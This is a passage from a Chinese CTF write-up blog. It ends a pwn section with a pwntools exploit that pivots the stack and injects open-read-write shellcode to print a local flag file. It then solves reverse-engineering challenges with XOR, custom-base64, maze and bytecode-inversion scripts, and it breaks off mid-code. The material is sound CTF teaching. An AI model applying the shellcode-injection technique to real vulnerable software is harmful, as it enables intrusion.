class="line">c.interactive()</span><br></pre></td></tr></table></figure><h2 id="0x06-not-bad"><a href="#0x06-not-bad" class="headerlink" title="0x06 not bad"></a>0x06 not bad</h2><p>相比babyshellcode，多了栈迁移，依旧是ORW</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Arch: amd64-64-little</span><br><span class="line">RELRO: Partial RELRO</span><br><span class="line">Stack: No canary found</span><br><span class="line">NX: NX disabled</span><br><span class="line">PIE: No PIE (0x400000)</span><br><span class="line">RWX: Has RWX segments</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">context.arch=<span class="string">'amd64'</span></span><br><span class="line">sh = process(<span class="string">"./bad"</span>)</span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">""</span></span><br><span class="line">shellcode += shellcraft.amd64.pushstr(<span class="string">'./flag'</span>).rstrip()</span><br><span class="line">shellcode += shellcraft.amd64.linux.syscall(<span class="string">'SYS_open'</span>,<span class="string">"rsp"</span>, <span class="number">0</span>).rstrip()</span><br><span class="line">shellcode += shellcraft.amd64.linux.syscall(<span class="string">'SYS_read'</span>,<span class="string">"rax"</span>, <span class="number">0x123500</span>,<span class="number">40</span>).rstrip()</span><br><span class="line">shellcode += shellcraft.amd64.linux.syscall(<span class="string">'SYS_write'</span>,<span class="number">1</span>, <span class="number">0x123500</span>,<span class="number">40</span>).rstrip()</span><br><span class="line">shellcode  = asm(shellcode)</span><br><span class="line"></span><br><span class="line">jmp_rsp = <span class="number">0x0000000000400a01</span></span><br><span class="line"></span><br><span class="line">payload  = <span class="string">""</span></span><br><span class="line">payload += asm(<span class="string">"mov rax,rsp;add rax,0x18"</span>,arch=<span class="string">"amd64"</span>,os=<span class="string">"linux"</span>)</span><br><span class="line">payload += asm(shellcraft.amd64.linux.syscall(<span class="string">'SYS_read'</span>,<span class="number">0</span>,<span class="string">"rax"</span>,<span class="number">0x60</span>).rstrip())</span><br><span class="line">payload  = payload.ljust(<span class="number">0x20</span>,<span class="string">'\x90'</span>) <span class="comment"># padding</span></span><br><span class="line">payload += p64(<span class="number">0xdeadbeef</span>) <span class="comment"># fake_ebp</span></span><br><span class="line">payload += p64(jmp_rsp)</span><br><span class="line">payload += asm(<span class="string">"sub rsp,0x30;jmp rsp"</span>,arch=<span class="string">"amd64"</span>,os=<span class="string">"linux"</span>).ljust(<span class="number">8</span>,<span class="string">'\x90'</span>)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">"Easy shellcode, have fun!"</span>)</span><br><span class="line">sh.send(payload)</span><br><span class="line">sh.send(shellcode)</span><br><span class="line">print(sh.recv())</span><br><span class="line">print(sh.recv())</span><br><span class="line">print(sh.recv())</span><br></pre></td></tr></table></figure><h1 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h1><h2 id="0x01-Jiang’s-fan"><a href="#0x01-Jiang’s-fan" class="headerlink" title="0x01 Jiang’s fan"></a>0x01 Jiang’s fan</h2><ul><li>签到题目,IDA打开就能看到flag</li></ul><h2 id="0x02-secret"><a href="#0x02-secret" class="headerlink" title="0x02 secret"></a>0x02 secret</h2><ul><li>拖入IDA找到关键字符串<code>5379637B6E30775F794F755F6B6E6F775F6234736531367D</code>,直接base16解码或者直接hex转ascii得到flag。</li></ul><h2 id="0x03-Easy-VB"><a href="#0x03-Easy-VB" class="headerlink" title="0x03 Easy VB"></a>0x03 Easy VB</h2><ul><li>用OD动态调试, 不能用IDA。</li><li>调试发现是将输入的flag与字符串<code>12345a789012345678g012345a789012</code>逐位异或,然后将结果与<code>bKPObQ@goYBGRXjtVKVSn^@kFQh[V_]O</code>比较,如果相等则输入flag正确。所以直接上脚本就行。</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line">a = <span class="string">'12345a789012345678g012345a789012'</span></span><br><span class="line">b = <span class="string">'bKPObQ@goYBGRXjtVKVSn^@kFQh[V_]O'</span></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(a)):</span><br><span class="line">    flag += chr(ord(a[i])^ord(b[i]))</span><br><span class="line"><span class="keyword">print</span> flag</span><br></pre></td></tr></table></figure><h2 id="0x04-冰菓"><a href="#0x04-冰菓" class="headerlink" title="0x04 冰菓"></a>0x04 冰菓</h2><ul><li>C#逆向,用dnSpy打开以后就能找到关键算法,直接逆算法就行。</li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20191101073212.png" alt></p><ul><li>脚本如下:</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line">L1 = [<span class="number">119</span>,<span class="number">77</span>,<span class="number">103</span>,<span class="number">79</span>,<span class="number">21</span>,</span><br><span class="line">      <span class="number">115</span>,<span class="number">133</span>,<span class="number">97</span>,<span class="number">115</span>,<span class="number">87</span>,</span><br><span class="line">      <span class="number">22</span>,<span class="number">115</span>,<span class="number">103</span>,<span class="number">89</span>,<span class="number">88</span>,</span><br><span class="line">      <span class="number">93</span>,<span class="number">22</span>,<span class="number">89</span>,<span class="number">119</span>,<span class="number">81</span>]</span><br><span class="line"></span><br><span class="line">L2 = [<span class="number">57</span>,<span class="number">13</span>]</span><br><span class="line"></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">20</span>):</span><br><span class="line">    flag += chr( (L1[i] - L2[<span class="number">1</span>])^ L2[<span class="number">0</span>] )</span><br><span class="line"><span class="keyword">print</span> flag</span><br></pre></td></tr></table></figure><h2 id="0x05-PYC是啥子嘛"><a href="#0x05-PYC是啥子嘛" class="headerlink" title="0x05 PYC是啥子嘛"></a>0x05 PYC是啥子嘛</h2><ul><li>拿到PYC程序反编译以后, 可以看出来是个迷宫, 大小为10×10，稍微改改可以变成这种形式。</li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20191101074059.png" alt></p><ul><li>要从S(Start) 走到 E(End)且路径长度最短, &amp;表示往上走, $表示往下走, 6表示往左走, 3表示往右走。</li><li>flag为 Syc{Your Input}</li></ul><h2 id="0x06-Dll-Reverse"><a href="#0x06-Dll-Reverse" class="headerlink" title="0x06 Dll Reverse"></a>0x06 Dll Reverse</h2><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20191110213533.png" alt></p><ul><li>题目加载<code>_setup0.dll</code>,调用里面的<code>_TRocMxlr</code>函数, 如果<code>_TRocMxlr</code>函数返回为true,则提示正确。 所以需要<code>sub_10001028(Str) != 0</code></li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">char</span> __usercall sub_10001028@&lt;al&gt;(<span class="keyword">const</span> <span class="keyword">char</span> *a1@&lt;eax&gt;)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *v1; <span class="comment">// edi</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v2; <span class="comment">// kr00_4</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// esi</span></span><br><span class="line">  _BYTE *v5; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v6; <span class="comment">// ecx</span></span><br><span class="line">  <span class="keyword">char</span> *v7; <span class="comment">// edx</span></span><br><span class="line">  <span class="keyword">char</span> v8; <span class="comment">// si</span></span><br><span class="line">  <span class="keyword">int</span> v9; <span class="comment">// edi</span></span><br><span class="line">  <span class="keyword">char</span> v10; <span class="comment">// bl</span></span><br><span class="line">  <span class="keyword">int</span> v11; <span class="comment">// esi</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v12; <span class="comment">// ecx</span></span><br><span class="line">  <span class="keyword">int</span> v13; <span class="comment">// esi</span></span><br><span class="line">  <span class="keyword">char</span> v14; <span class="comment">// al</span></span><br><span class="line">  <span class="keyword">char</span> v15; <span class="comment">// al</span></span><br><span class="line">  <span class="keyword">int</span> v16; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v18; <span class="comment">// [esp+8h] [ebp-8h]</span></span><br><span class="line">  <span class="keyword">int</span> v19; <span class="comment">// [esp+Ch] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">  v1 = a1;</span><br><span class="line">  v2 = <span class="built_in">strlen</span>(a1);</span><br><span class="line">  v3 = v2 / <span class="number">3</span>;</span><br><span class="line">  v18 = v2 % <span class="number">3</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v2 % <span class="number">3</span> )</span><br><span class="line">    v4 = <span class="number">4</span> * v3 + <span class="number">4</span>;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    v4 = <span class="number">4</span> * v3;</span><br><span class="line">  v5 = <span class="built_in">malloc</span>(v4 + <span class="number">1</span>);</span><br><span class="line">  v6 = <span class="number">0</span>;</span><br><span class="line">  v5[v4] = <span class="number">0</span>;</span><br><span class="line">  v19 = v4 - <span class="number">2</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v4 - <span class="number">2</span> &gt; <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v7 = (<span class="keyword">char</span> *)(v1 + <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      v8 = *(v7 - <span class="number">1</span>);</span><br><span class="line">      v9 = *v7;</span><br><span class="line">      v5[v6] = base64Table[*(v7 - <span class="number">1</span>) &gt;&gt; <span class="number">2</span>];</span><br><span class="line">      v10 = base64Table[(v9 &gt;&gt; <span class="number">4</span>) | <span class="number">16</span> * (v8 &amp; <span class="number">3</span>)];</span><br><span class="line">      v11 = v7[<span class="number">1</span>];</span><br><span class="line">      v5[v6 + <span class="number">1</span>] = v10;</span><br><span class="line">      v5[v6 + <span class="number">2</span>] = base64Table[(v11 &gt;&gt; <span class="number">6</span>) | <span class="number">4</span> * (v9 &amp; <span class="number">0xF</span>)];</span><br><span class="line">      v5[v6 + <span class="number">3</span>] = base64Table[v11 &amp; <span class="number">0x3F</span>];</span><br><span class="line">      v6 += <span class="number">4</span>;</span><br><span class="line">      v7 += <span class="number">3</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( v6 &lt; v19 );</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( v18 == <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    *(_WORD *)&amp;v5[v6 - 2] = '==';</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( v18 == <span class="number">2</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v5[v6 - <span class="number">1</span>] = <span class="string">'='</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  v12 = <span class="number">0</span>;</span><br><span class="line">  v13 = v5 - s1;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    v14 = s1[v13 + v12];</span><br><span class="line">    <span class="keyword">if</span> ( v12 % <span class="number">2</span> )</span><br><span class="line">      v15 = s1[v12] ^ v14;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      v15 = (s1[v12] ^ v14) + <span class="number">3</span>;</span><br><span class="line">    byte_10003390[v12++] = v15;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( v12 &lt; <span class="number">32</span> );</span><br><span class="line">  v16 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( byte_10003390[v16] == s2[v16] )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( ++v16 &gt;= <span class="number">32</span> )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><p>根据伪代码, 这个函数先把我们输入的flag进行base64加密,然后分情况进行异或运算,最后与s2进行比较,如果如果一致,则成功。</p></li><li><p>注意这里的base64进行了换表!!!! 这里的base64Table为<code>BCDEFGHIJKLMNOPQSVXZRWYTUeadbcfghijklmnopqrstuvwxyz0123456789+/</code></p></li><li><p>另外:</p></li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">v12 = <span class="number">0</span>;</span><br><span class="line">v13 = v5 - s1;</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line">  v14 = s1[v13 + v12];</span><br></pre></td></tr></table></figure><ul><li><p>这一块不太容易搞清<code>v14 = s1[v13+v12]</code>到底是什么? 通过OD动态调试得知, v14每次都是依次取的flag经过base64加密以后的字符串的字符。</p></li><li><p>所以解密脚本如下:</p></li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line">s1 = <span class="string">'''</span></span><br><span class="line"><span class="string">45 6A 43 34 56 3B 4F 67  47 43 19 23 43 75 6C 67</span></span><br><span class="line"><span class="string">3B 65 54 46 42 37 01 50  55 60 49 24 18 4A 27 1F</span></span><br><span class="line"><span class="string">09 1D 4A 00</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">L1 = s1.split()</span><br><span class="line">s2 = <span class="string">'''</span></span><br><span class="line"><span class="string">22 59 32 5E  38 0B 42 56 26 70 4D 45</span></span><br><span class="line"><span class="string">13 22 2D 1D 5B 37 70 03  12 60 7C 36 07 53 03 53</span></span><br><span class="line"><span class="string">4F 78 56 26 </span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">ss = <span class="string">''</span></span><br><span class="line"></span><br><span class="line">L2 = s2.split()</span><br><span class="line"><span class="keyword">print</span> L2</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">32</span>):</span><br><span class="line">    <span class="keyword">if</span> i%<span class="number">2</span> == <span class="number">1</span>:</span><br><span class="line">        ss += chr(int(L1[i],<span class="number">16</span>) ^ int(L2[i],<span class="number">16</span>)&amp;<span class="number">0xff</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        ss += chr(int(L1[i],<span class="number">16</span>) ^ (int(L2[i],<span class="number">16</span>) - <span class="number">3</span>)&amp;<span class="number">0xff</span>)</span><br><span class="line"><span class="keyword">print</span> ss</span><br><span class="line"></span><br><span class="line">string1 = <span class="string">"ABCDEFGHIJKLMNOPQSVXZRWYTUeadbcfghijklmnopqrstuvwxyz0123456789+/"</span></span><br><span class="line">string2 = <span class="string">"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> base64.b64decode(ss.translate(string.maketrans(string1,string2)))</span><br></pre></td></tr></table></figure><h2 id="0x07-Win32-Program"><a href="#0x07-Win32-Program" class="headerlink" title="0x07 Win32 Program"></a>0x07 Win32 Program</h2><h2 id="0x08-阅兵你认真看了么"><a href="#0x08-阅兵你认真看了么" class="headerlink" title="0x08 阅兵你认真看了么"></a>0x08 阅兵你认真看了么</h2><ul><li>官方WP如下:</li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20191118230117.png" alt></p><ul><li><p>可以直接爆破MD5,字典选用ABCD,就五位,直接正向爆破得到<code>ACBAD</code> 。</p></li><li><p>也可以在线解密MD5。</p></li><li><p>可以分析到unk_2020A0为数独第一行。unk_2020C4为数独的第二行到第九行。</p></li><li><p>由此可以得到数独:</p></li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span> <span class="number">2</span> <span class="number">0</span> <span class="number">5</span> <span class="number">4</span> <span class="number">3</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span></span><br><span class="line"><span class="number">0</span> <span class="number">3</span> <span class="number">0</span> <span class="number">0</span> <span class="number">9</span> <span class="number">8</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span></span><br><span class="line"><span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">6</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">5</span></span><br><span class="line"><span class="number">3</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">4</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span></span><br><span class="line"><span class="number">0</span> <span class="number">0</span> <span class="number">7</span> <span class="number">0</span> <span class="number">5</span> <span class="number">0</span> <span class="number">8</span> <span class="number">0</span> <span class="number">0</span></span><br><span class="line"><span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">6</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">9</span></span><br><span class="line"><span class="number">5</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">7</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span></span><br><span class="line"><span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">4</span> <span class="number">2</span> <span class="number">0</span> <span class="number">0</span> <span class="number">1</span> <span class="number">0</span></span><br><span class="line"><span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">9</span> <span class="number">8</span> <span class="number">1</span> <span class="number">0</span> <span class="number">2</span> <span class="number">3</span></span><br></pre></td></tr></table></figure><ul><li>在线数独求解可得</li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20191118230604.png" alt></p><ul><li><p>从而得到我们应该输入<code>679845716297812345981276642931281374512369848935677645</code></p></li><li><p>运行程序并输入两组答案<code>ACBAD</code>和<code>679845716297812345981276642931281374512369848935677645</code>即可得到flag。</p></li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20191118230736.png" alt></p><h2 id="0x09-Python1"><a href="#0x09-Python1" class="headerlink" title="0x09 Python1"></a>0x09 Python1</h2><ul><li>这道题挺顶的,反编译以后的代码如下:</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> struct, time</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">b</span><span class="params">(a)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> a &amp; <span class="number">0xffffffffffffffffL</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">c</span><span class="params">(str)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> struct.unpack(<span class="string">'&lt;Q'</span>, str)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">d</span><span class="params">(a)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">64</span>):</span><br><span class="line">        a = a * <span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span> a &gt; <span class="number">0xffffffffffffffffL</span>:</span><br><span class="line">            a = b(a)</span><br><span class="line">            a = b(a ^ <span class="number">0xb0004b7679fa26b3L</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> a</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    cmp_data = [</span><br><span class="line">     <span class="number">7966260180038414229L</span>, <span class="number">16286944838295011030L</span>,</span><br><span class="line">     <span class="number">8598951912044448753L</span>, <span class="number">7047634009948092561L</span>, <span class="number">7308282357635670895L</span>]</span><br><span class="line">    input = raw_input(<span class="string">'plz input your flag:'</span>)</span><br><span class="line">    <span class="keyword">if</span> len(input) % <span class="number">8</span> != <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span> - len(input) % <span class="number">8</span>):</span><br><span class="line">            input += <span class="string">'\x00'</span></span><br><span class="line"></span><br><span class="line">    arr = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(input) / <span class="number">8</span>):</span><br><span class="line">        value = d(c(input[i * <span class="number">8</span>:i * <span class="number">8</span> + <span class="number">8</span>]))</span><br><span class="line">        arr.append(value)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">5</span>):</span><br><span class="line">        <span class="keyword">if</span> arr[i] != cmp_data[i]:</span><br><span class="line">            <span class="keyword">print</span> <span class="string">'fail'</span></span><br><span class="line">            time.sleep(<span class="number">5</span>)</span><br><span class="line">            exit()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">print</span> <span class="string">'success'</span></span><br><span class="line">    time.sleep(<span class="number">5</span>)</span><br><span class="line">    exit()</span><br></pre></td></tr></table></figure><ul><li><p>重点在于b函数和d函数。如果a经过×2运算以后大于<code>0xffffffffffffffffL</code>(即溢出了),则先按位与<code>0xffffffffffffffffL</code>,然后再与<code>0xb0004b7679fa26b3L</code>异或,则得到的结果一定为奇数。如果a经过×2运算以后小于等于<code>0xffffffffffffffffL</code>,则一定为偶数。</p></li><li><p>另外一个关键点在于,如何还原溢出的数据?</p></li><li><p>对于这个程序,如果a×2(相当于左移1位)以后溢出了,那么损失的是最高位(转换成二进制来看),最低位会自动补为0。那么我们只需要补回来最高位(加上2的最高位次方,比如这次是加上2的64次方)然后再除以2就能得到原来的a了。</p></li><li><p>根据这些可以得出解密脚本。</p></li><li><p>鉴于C语言unsigned long long 最大有64位, 而我们的溢出位就是第64位,所以我们可以先除以2,然后再加上原本要补的值的一半,就相当于先加上要补的值然后再除以2。</p></li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// C语言版解密脚本</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> answer[] = &#123; <span class="number">0x6e8dd76d3b876f95</span>L, <span class="number">0xe206da09daf4bed6</span>L,<span class="number">0x77559d346e134bf1</span>L, <span class="number">0x61ce39cac5eaf891</span>L, <span class="number">0x656c3c155520e36f</span>L &#125;;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i&lt;<span class="number">5</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> tmp = answer[i];</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; <span class="number">64</span>; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (tmp &amp; <span class="number">1</span>)<span class="comment">//结果为奇数</span></span><br><span class="line">            &#123;</span><br><span class="line">                tmp ^= <span class="number">0xb0004b7679fa26b3</span>;<span class="comment">//先异或回去。</span></span><br><span class="line">                tmp &gt;&gt;=<span class="number">1</span>;<span class="comment">//相当于除以2</span></span><br><span class="line">                tmp += <span class="number">0x8000000000000000</span>;<span class="comment">//加上要补值(2的64次方)的一半</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span><span class="comment">//结果为偶数</span></span><br><span class="line">            &#123;</span><br><span class="line">                tmp&gt;&gt;=<span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        answer[i] = tmp;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>((<span class="keyword">char</span>*)answer);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>此刻python的优势显出来了。</li><li>Python解密脚本如下:</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*</span></span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decode</span><span class="params">(a)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">64</span>):</span><br><span class="line">        <span class="keyword">if</span>(a % <span class="number">2</span> == <span class="number">0</span>):</span><br><span class="line">            a /= <span class="number">2</span></span><br><span class="line">        <span class="keyword">else</span>:            </span><br><span class="line">            a ^= <span class="number">0xB0004B7679FA26B3</span>            </span><br><span class="line">            a = a + <span class="number">0xffffffffffffffff</span> + <span class="number">1</span>            </span><br><span class="line">            a /= <span class="number">2</span>    </span><br><span class="line">    <span class="keyword">return</span> a</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    cmp_data = [<span class="number">7966260180038414229L</span>, <span class="number">16286944838295011030L</span>, <span class="number">8598951912044448753L</span>, <span class="number">7047634009948092561L</span>, <span class="number">7308282357635670895L</span>]</span><br><span class="line">    flag = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">5</span>):</span><br><span class="line">        flag += struct.pack(<span class="string">"&gt;Q"</span>,decode(cmp_data[i]))[::<span class="number">-1</span>].strip()<span class="comment">#需要注意这里的[::-1],用来逆序！</span></span><br><span class="line">    <span class="keyword">print</span> flag</span><br></pre></td></tr></table></figure><h2 id="0x10-Python2"><a href="#0x10-Python2" class="headerlink" title="0x10 Python2"></a>0x10 Python2</h2><ul><li>反编译以后得到如下代码:</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> struct, time</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fun</span><span class="params">(start, end, s)</span>:</span></span><br><span class="line">    a = <span class="number">32310901</span></span><br><span class="line">    b = <span class="number">1729</span></span><br><span class="line">    c = s</span><br><span class="line">    m = end - start</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        d = int((a * c + b) % m)</span><br><span class="line">        <span class="keyword">yield</span> d</span><br><span class="line">        c = d</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    arr = [</span><br><span class="line">     <span class="number">77</span>, <span class="number">263</span>, <span class="number">394</span>, <span class="number">442</span>, <span class="number">463</span>, <span class="number">512</span>, <span class="number">667</span>, <span class="number">641</span>, <span class="number">804</span>, <span class="number">752</span>, <span class="number">885</span>, <span class="number">815</span>, <span class="number">1075</span>, <span class="number">1059</span>, <span class="number">1166</span>, <span class="number">1082</span>, <span class="number">1429</span>, <span class="number">1583</span>, <span class="number">1696</span>, <span class="number">1380</span>,</span><br><span class="line">     <span class="number">1987</span>, <span class="number">2263</span>, <span class="number">2128</span>, <span class="number">2277</span>, <span class="number">2387</span>, <span class="number">2670</span>, <span class="number">2692</span>, <span class="number">3255</span>, <span class="number">3116</span>, <span class="number">3306</span>, <span class="number">3132</span>, <span class="number">3659</span>, <span class="number">3139</span>, <span class="number">3422</span>, <span class="number">3600</span>, <span class="number">3584</span>, <span class="number">3343</span>, <span class="number">3546</span>,</span><br><span class="line">     <span class="number">3299</span>, <span class="number">3633</span>, <span class="number">3281</span>, <span class="number">3146</span>, <span class="number">2990</span>, <span class="number">2617</span>, <span class="number">2780</span>, <span class="number">2893</span>, <span class="number">2573</span>, <span class="number">2584</span>, <span class="number">2424</span>, <span class="number">2715</span>, <span class="number">2513</span>, <span class="number">2324</span>, <span class="number">2080</span>, <span class="number">2293</span>, <span class="number">2245</span>, <span class="number">2309</span>,</span><br><span class="line">     <span class="number">2036</span>, <span class="number">1944</span>, <span class="number">1931</span>, <span class="number">1817</span>, <span class="number">1483</span>, <span class="number">1372</span>, <span class="number">1087</span>, <span class="number">1221</span>, <span class="number">893</span>, <span class="number">785</span>, <span class="number">697</span>, <span class="number">586</span>, <span class="number">547</span>, <span class="number">324</span>, <span class="number">177</span>, <span class="number">184</span>]</span><br><span class="line">    flag = raw_input(<span class="string">'plz input your flag:'</span>)</span><br><span class="line">    length = len(flag)</span><br><span class="line">    a = struct.unpack(<span class="string">'&lt;I'</span>, flag[length - <span class="number">4</span>:].encode())[<span class="number">0</span>] &amp; <span class="number">255</span></span><br><span class="line">    b = []</span><br><span class="line">    c = fun(<span class="number">1</span>, <span class="number">255</span>, a)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">32</span>):</span><br><span class="line">        b.append(next(c))</span><br><span class="line"></span><br><span class="line">    d = [ <span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">72</span>) ]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(length):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">32</span>):</span><br><span class="line">            a = ord(flag[i]) ^ b[j]</span><br><span class="line">            d[(i + j)] += a</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(d)):</span><br><span class="line">        <span class="keyword">if</span> d[i] != arr[i]:</span><br><span class="line">            <span class="keyword">print</span> <span class="string">'fail'</span></span><br><span class="line">            time.sleep(<span class="number">5</span>)</span><br><span class="line">            exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">print</span> <span 